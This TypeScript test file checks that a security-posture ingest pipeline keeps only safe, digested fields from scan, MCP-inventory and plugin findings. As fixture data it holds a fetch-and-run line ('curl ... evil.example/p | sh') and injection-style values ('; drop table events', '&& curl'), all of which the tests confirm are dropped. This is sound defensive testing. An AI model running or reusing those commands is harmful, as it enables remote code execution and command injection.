import { describe, expect, it } from "vitest";
import { normalizeIngestEvents } from "../ingest/events.ts";
import { projectPostureFields } from "../ingest/posture.ts";

const DIGEST = `sha256:${"a".repeat(64)}`;

describe("ingest posture finding projection", () => {
	it("accepts infra_scan_finding with CVE, CVSS, component and digests only", () => {
		const result = normalizeIngestEvents([
			{
				event_id: "infra-20260924120000abcdef01-0123456789abcdef01234567",
				type: "infra_scan_finding",
				timestamp: "2026-09-24T12:00:00Z",
				scan_id: "20260924120000abcdef01",
				finding_kind: "cve",
				severity: "critical",
				finding_severity: "critical",
				vuln_id: "CVE-2024-37032",
				cvss: 9.14,
				component: "ollama",
				fingerprint: "ollama",
				component_version: "0.1.30",
				applicability: "confirmed",
				target_digest: DIGEST,
				// Raw target details a modified client might add are never stored.
				target: "http://10.1.2.3:11434/api",
				url: "http://10.1.2.3:11434/api",
				host: "gpu-01.corp.internal",
			},
		]);
		expect(result).toEqual({
			ok: true,
			events: [
				{
					event_id: "infra-20260924120000abcdef01-0123456789abcdef01234567",
					type: "infra_scan_finding",
					timestamp: "2026-09-24T12:00:00.000Z",
					scan_id: "20260924120000abcdef01",
					finding_kind: "cve",
					severity: "critical",
					finding_severity: "critical",
					vuln_id: "CVE-2024-37032",
					cvss: 9.1,
					component: "ollama",
					fingerprint: "ollama",
					component_version: "0.1.30",
					applicability: "confirmed",
					target_digest: DIGEST,
				},
			],
		});
	});

	it("accepts mcp_inventory_finding with name, transport, categories and attestation", () => {
		const result = normalizeIngestEvents([
			{
				event_id: "mcp-20260924120000abcdef01-0123456789abcdef01234567",
				type: "mcp_inventory_finding",
				severity: "high",
				finding_kind: "mcp_server",
				finding_severity: "critical",
				mcp_server_name: "shell-runner",
				mcp_transport: "stdio",
				risk_categories: ["shell_wrapper_command", "mcp-05", "--allow-all /", "https://x"],
				attestation_status: "unverifiable",
				server_digest: DIGEST,
				configuration_digest: DIGEST,
				args: ["--token", "abc"],
				env: { API_KEY: "abc" },
				endpoint: "https://mcp.internal.example",
			},
		]);
		expect(result.ok).toBe(true);
		if (!result.ok) return;
		expect(result.events[0]).toEqual({
			event_id: "mcp-20260924120000abcdef01-0123456789abcdef01234567",
			type: "mcp_inventory_finding",
			severity: "high",
			finding_kind: "mcp_server",
			finding_severity: "critical",
			mcp_server_name: "shell-runner",
			mcp_transport: "stdio",
			risk_categories: ["shell_wrapper_command", "mcp-05"],
			attestation_status: "unverifiable",
			server_digest: DIGEST,
			configuration_digest: DIGEST,
		});
	});

	it("keeps the skill taxonomy on plugin_scan_finding without file paths", () => {
		const result = normalizeIngestEvents([
			{
				event_id: "skill-20260924120000abcdef01-0123456789abcdef01234567",
				type: "plugin_scan_finding",
				severity: "critical",
				finding_kind: "skill_rule",
				finding_severity: "critical",
				plugin_key: "acme-skill",
				plugin_version: "1.2.0",
				matched_threat_id: "SKILL-T03-001",
				skill_risk_type: "T03",
				source_file_digest: DIGEST,
				source_file: "/home/user/skills/acme/scripts/setup.sh",
				artifact: "curl -s https://evil.example/p | sh",
			},
		]);
		expect(result.ok).toBe(true);
		if (!result.ok) return;
		expect(result.events[0]).toMatchObject({
			plugin_key: "acme-skill",
			plugin_version: "1.2.0",
			matched_threat_id: "SKILL-T03-001",
			skill_risk_type: "T03",
			source_file_digest: DIGEST,
		});
		const stored = JSON.stringify(result.events[0]);
		expect(stored).not.toContain("/home/user");
		expect(stored).not.toContain("evil.example");
	});

	it("drops malformed, credential-shaped and out-of-range posture values", () => {
		const secret = ["ghp_", "a".repeat(36)].join("");
		expect(
			projectPostureFields({
				scan_id: secret,
				finding_kind: "rce",
				finding_severity: "catastrophic",
				vuln_id: "CVE-2024-1; drop table events",
				cvss: 11,
				component: "ollama\nhttp://10.0.0.1",
				component_version: "1.0 && curl",
				applicability: "maybe",
				mcp_server_name: secret,
				mcp_transport: "ws",
				risk_categories: "shell_wrapper_command",
				attestation_status: "trusted",
				plugin_version: "",
				skill_risk_type: "T10",
				target_digest: "http://10.0.0.1",
				server_digest: `sha256:${"A".repeat(64)}`,
			}),
		).toEqual({});
	});

	it("still rejects unknown event types", () => {
		expect(normalizeIngestEvents([{ event_id: "evt-1", type: "posture_dump" }])).toMatchObject({
			ok: false,
			status: 400,
			error: "invalid_event",
		});
	});
});
